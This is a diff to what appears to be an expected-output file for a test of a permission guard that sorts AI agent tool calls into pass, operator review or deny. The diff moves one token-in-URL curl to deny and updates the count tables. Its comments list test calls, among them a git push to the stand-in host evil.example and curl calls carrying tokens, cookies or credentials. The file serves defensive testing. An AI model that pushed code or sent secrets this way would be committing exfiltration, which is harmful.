@@ -15,7 +15,7 @@
 #   touch: guard curl (joins s1 tu1)     supervisor  guard asks         → operator
 #   touch: guard WebFetch (joins tu4)    supervisor  guard asks         → operator
 #   touch: direct long echo (joins tu5)  unknown → Advisor, prompted   → operator
-#   touch: direct token=*** (joins the generated curl)  unknown, guard asks → operator
+#   touch: direct token=*** (joins the generated curl)  unknown, #322 token in a URL → deny
 #   teamlead-log: 2 Operator lines       not replayable
 #   guard-corpus: 2 none → pass, 1 ask → operator (Supervisor, corpus opt-ins, not prompted)
 # Observed: the linked intervention → operator (its touch row); a-4 → operator (answer sidecar);
@@ -25,27 +25,29 @@
 #   stage, the clone); s3 is a sibling dir that is not listed and never read:
 #   git status ×2 (unknown) + ×1 (stage)  pass — one unique call, weighted 3, two contexts
 #   ls -la, echo <long>, printf <key block>, git log --author=<email>        unknown pass
-#   curl example.com, WebFetch unlisted.example, git push git@evil.example:o/r, WebFetch
-#   docs.example (no local rule for an Advisor), curl token / Authorization / Cookie / -u /
-#   userinfo                                                                   unknown operator (9)
+#   curl -L example.com, WebFetch unlisted.example, git push git@evil.example:o/r, WebFetch
+#   docs.example (no local rule for an Advisor), curl Authorization / Cookie / -u /
+#   userinfo                                                                   unknown operator (8)
+#   curl token (#322: a token in a URL)                                        unknown deny (1)
 #   make test (clone root + src/: two occurrences), rm scratch.txt              stage pass
+# The #322 effect view tables are compared apart (expected-effect.txt).
 ### Outcome by label
 | row | pass | lead | supervisor-clearable | operator | deny | not-replayable |
 | modeled | 0 | 0 | 0 | 0 | 0 | 1 |
-| unknown-as-advisor | 0 | 0 | 0 | 2 | 0 | 0 |
+| unknown-as-advisor | 0 | 0 | 0 | 1 | 1 | 0 |
 | unlabelled | 2 | 2 | 0 | 5 | 0 | 3 |
 ### Observed handling × simulated outcome
 | row | pass | lead | supervisor-clearable | operator | deny | not-replayable |
-| operator | 0 | 1 | 0 | 5 | 0 | 0 |
+| operator | 0 | 1 | 0 | 4 | 1 | 0 |
 | unanswered | 0 | 1 | 0 | 1 | 0 | 1 |
 | unknown | 2 | 0 | 0 | 1 | 0 | 3 |
 recorded vs simulated tier: 0 differ
 guard-corpus expectations: all match
 ### Unique calls (most severe occurrence)
 | row | pass | lead | supervisor-clearable | operator | deny | not-replayable |
-| unknown-as-advisor | 4 | 0 | 0 | 9 | 0 | 0 |
+| unknown-as-advisor | 4 | 0 | 0 | 8 | 1 | 0 |
 | unlabelled | 3 | 0 | 0 | 0 | 0 | 0 |
 ### Occurrence-weighted
 | row | pass | lead | supervisor-clearable | operator | deny | not-replayable |
-| unknown-as-advisor | 6 | 0 | 0 | 9 | 0 | 0 |
+| unknown-as-advisor | 6 | 0 | 0 | 8 | 1 | 0 |
 | unlabelled | 4 | 0 | 0 | 0 | 0 | 0 |
